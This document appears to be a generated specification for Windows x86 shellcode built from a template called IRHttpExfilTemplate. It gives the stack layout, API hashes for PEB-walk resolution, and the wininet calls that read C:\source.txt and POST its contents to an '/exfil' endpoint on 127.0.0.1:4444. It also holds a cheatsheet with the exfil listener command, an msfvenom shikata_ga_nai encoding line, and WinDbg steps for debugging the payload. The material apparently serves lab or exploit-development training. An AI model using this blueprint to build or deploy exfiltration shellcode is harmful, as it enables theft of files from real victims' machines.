# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x200` (0x200 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | wininet.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x28]` | LoadLibraryA | kernel32.dll |
| `[ebp-0x2c]` | CreateFileA | kernel32.dll |
| `[ebp-0x30]` | ReadFile | kernel32.dll |
| `[ebp-0x34]` | CloseHandle | kernel32.dll |
| `[ebp-0x38]` | VirtualAlloc | kernel32.dll |
| `[ebp-0x3c]` | InternetOpenA | wininet.dll |
| `[ebp-0x40]` | InternetConnectA | wininet.dll |
| `[ebp-0x44]` | HttpOpenRequestA | wininet.dll |
| `[ebp-0x48]` | HttpSendRequestA | wininet.dll |
| `[ebp-0x4c]` | InternetCloseHandle | wininet.dll |
| `[ebp-0x50]` | ExitProcess | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x54]` | bytes_total | 4 |
| `[ebp-0x58]` | bytes_read | 4 |
| `[ebp-0x5c]` | buf_ptr | 4 |
| `[ebp-0x60]` | file_handle | 4 |
| `[ebp-0x64]` | virt_buf | 4 |
| `[ebp-0x68]` | rf_ret | 4 |
| `[ebp-0x6c]` | inet_session | 4 |
| `[ebp-0x70]` | inet_conn | 4 |
| `[ebp-0x74]` | inet_request | 4 |
| `[ebp-0x78]` | send_ret | 4 |

## Structures

_No structures._

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0x110]` | src_path | C:\source.txt | 16 |
| `[ebp-0x11c]` | user_agent | Mozilla/5.0 | 12 |
| `[ebp-0x128]` | exfil_host | 127.0.0.1 | 12 |
| `[ebp-0x130]` | url_path | /exfil | 8 |
| `[ebp-0x138]` | http_post | POST | 8 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x28]` | library |
| CreateFileA | `0x7c0017a5` | `[ebp-0x2c]` | filesystem |
| ReadFile | `0x10fa6516` | `[ebp-0x30]` | filesystem |
| CloseHandle | `0x0ffd97fb` | `[ebp-0x34]` | synchronization |
| VirtualAlloc | `0x91afca54` | `[ebp-0x38]` | memory |
| ExitProcess | `0x73e2d87e` | `[ebp-0x50]` | process |

### API Details

#### LoadLibraryA

**Slot:** `[ebp-0x28]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

#### CreateFileA

**Slot:** `[ebp-0x2c]`
**Hash:** `0x7c0017a5`
**Module:** kernel32.dll
**Category:** filesystem

```c
HANDLE CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpFileName | LPCSTR |  |
| 2 | dwDesiredAccess | DWORD | GENERIC_READ=0x80000000, GENERIC_WRITE=0x40000000 |
| 3 | dwShareMode | DWORD | 0 for exclusive |
| 4 | lpSecurityAttributes | LPSECURITY_ATTRIBUTES | NULL |
| 5 | dwCreationDisposition | DWORD | OPEN_EXISTING=3, CREATE_ALWAYS=2 |
| 6 | dwFlagsAndAttributes | DWORD | FILE_ATTRIBUTE_NORMAL=0x80 |
| 7 | hTemplateFile | HANDLE | NULL |

---

#### ReadFile

**Slot:** `[ebp-0x30]`
**Hash:** `0x10fa6516`
**Module:** kernel32.dll
**Category:** filesystem

```c
BOOL ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hFile | HANDLE | handle from CreateFileA |
| 2 | lpBuffer | LPVOID | pointer to destination buffer |
| 3 | nNumberOfBytesToRead | DWORD | number of bytes to read |
| 4 | lpNumberOfBytesRead | LPDWORD | pointer to DWORD for bytes read; NULL if lpOverlapped set |
| 5 | lpOverlapped | LPOVERLAPPED | NULL for synchronous I/O |

---

#### CloseHandle

**Slot:** `[ebp-0x34]`
**Hash:** `0x0ffd97fb`
**Module:** kernel32.dll
**Category:** synchronization

```c
BOOL CloseHandle(HANDLE hObject)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hObject | HANDLE | handle to close; returns nonzero on success |

---

#### VirtualAlloc

**Slot:** `[ebp-0x38]`
**Hash:** `0x91afca54`
**Module:** kernel32.dll
**Category:** memory

```c
LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpAddress | LPVOID | NULL to let OS choose; or preferred address |
| 2 | dwSize | SIZE_T | size of region in bytes |
| 3 | flAllocationType | DWORD | MEM_COMMIT|MEM_RESERVE = 0x3000 |
| 4 | flProtect | DWORD | PAGE_EXECUTE_READWRITE = 0x40 |

---

#### ExitProcess

**Slot:** `[ebp-0x50]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

## wininet.dll

Resolution: `LoadLibraryA("wininet.dll")` -> base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| InternetOpenA | `0x57e84429` | `[ebp-0x3c]` | internet |
| InternetConnectA | `0x1e4be80e` | `[ebp-0x40]` | internet |
| HttpOpenRequestA | `0xf7de769f` | `[ebp-0x44]` | internet |
| HttpSendRequestA | `0x2de6be9d` | `[ebp-0x48]` | internet |
| InternetCloseHandle | `0xfa9b69c7` | `[ebp-0x4c]` | internet |

### API Details

#### InternetOpenA

**Slot:** `[ebp-0x3c]`
**Hash:** `0x57e84429`
**Module:** wininet.dll
**Category:** internet

```c
HINTERNET InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpszAgent | LPCSTR | user-agent string, e.g. Mozilla/5.0 |
| 2 | dwAccessType | DWORD | INTERNET_OPEN_TYPE_DIRECT = 1 |
| 3 | lpszProxy | LPCSTR | NULL for direct |
| 4 | lpszProxyBypass | LPCSTR | NULL |
| 5 | dwFlags | DWORD | 0 |

---

#### InternetConnectA

**Slot:** `[ebp-0x40]`
**Hash:** `0x1e4be80e`
**Module:** wininet.dll
**Category:** internet

```c
HINTERNET InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hInternet | HINTERNET | handle from InternetOpenA |
| 2 | lpszServerName | LPCSTR | hostname or IP, e.g. 192.168.1.10 |
| 3 | nServerPort | INTERNET_PORT | port number (e.g. 80, 8000) |
| 4 | lpszUserName | LPCSTR | NULL for anonymous |
| 5 | lpszPassword | LPCSTR | NULL for anonymous |
| 6 | dwService | DWORD | INTERNET_SERVICE_HTTP = 3 |
| 7 | dwFlags | DWORD | 0 |
| 8 | dwContext | DWORD_PTR | 0 |

---

#### HttpOpenRequestA

**Slot:** `[ebp-0x44]`
**Hash:** `0xf7de769f`
**Module:** wininet.dll
**Category:** internet

```c
HINTERNET HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hConnect | HINTERNET | handle from InternetConnectA |
| 2 | lpszVerb | LPCSTR | HTTP method, e.g. POST |
| 3 | lpszObjectName | LPCSTR | URL path, e.g. /upload |
| 4 | lpszVersion | LPCSTR | NULL for HTTP/1.1 |
| 5 | lpszReferrer | LPCSTR | NULL |
| 6 | lplpszAcceptTypes | LPCSTR* | NULL for */* |
| 7 | dwFlags | DWORD | 0 |
| 8 | dwContext | DWORD_PTR | 0 |

---

#### HttpSendRequestA

**Slot:** `[ebp-0x48]`
**Hash:** `0x2de6be9d`
**Module:** wininet.dll
**Category:** internet

```c
BOOL HttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hRequest | HINTERNET | handle from HttpOpenRequestA |
| 2 | lpszHeaders | LPCSTR | NULL for default |
| 3 | dwHeadersLength | DWORD | 0 if lpszHeaders is NULL |
| 4 | lpOptional | LPVOID | pointer to POST body data |
| 5 | dwOptionalLength | DWORD | size of POST body in bytes |

---

#### InternetCloseHandle

**Slot:** `[ebp-0x4c]`
**Hash:** `0xfa9b69c7`
**Module:** wininet.dll
**Category:** internet

```c
BOOL InternetCloseHandle(HINTERNET hInternet)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hInternet | HINTERNET | any HINTERNET handle to close |

---

---

# Structure Layouts

---

# Operational Cheatsheet

**Template:** IRHttpExfilTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Catch POST:**
```
python3 Tools/http_exfil_server.py --port 4444 --bind 127.0.0.1
```

**Source file on target:**
```
C:\source.txt
```

**POST endpoint:**
```
http://127.0.0.1:4444/exfil
```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x28 L1    ; LoadLibraryA
dd ebp-0x2c L1    ; CreateFileA
dd ebp-0x30 L1    ; ReadFile
dd ebp-0x34 L1    ; CloseHandle
dd ebp-0x38 L1    ; VirtualAlloc
dd ebp-0x3c L1    ; InternetOpenA
dd ebp-0x40 L1    ; InternetConnectA
dd ebp-0x44 L1    ; HttpOpenRequestA
dd ebp-0x48 L1    ; HttpSendRequestA
dd ebp-0x4c L1    ; InternetCloseHandle
dd ebp-0x50 L1    ; ExitProcess
```

## Inspect Structures Before API Calls

## Inspect Stack Strings

```
da ebp-0x110    ; src_path
```

```
da ebp-0x11c    ; user_agent
```

```
da ebp-0x128    ; exfil_host
```

```
da ebp-0x130    ; url_path
```

```
da ebp-0x138    ; http_post
```

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_LoadLibraryA>
bp <sc_base>+<offset_of_call_CreateFileA>
bp <sc_base>+<offset_of_call_ReadFile>
bp <sc_base>+<offset_of_call_CloseHandle>
bp <sc_base>+<offset_of_call_VirtualAlloc>
bp <sc_base>+<offset_of_call_InternetOpenA>
bp <sc_base>+<offset_of_call_InternetConnectA>
bp <sc_base>+<offset_of_call_HttpOpenRequestA>
bp <sc_base>+<offset_of_call_HttpSendRequestA>
bp <sc_base>+<offset_of_call_InternetCloseHandle>
bp <sc_base>+<offset_of_call_ExitProcess>  ; does not return
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.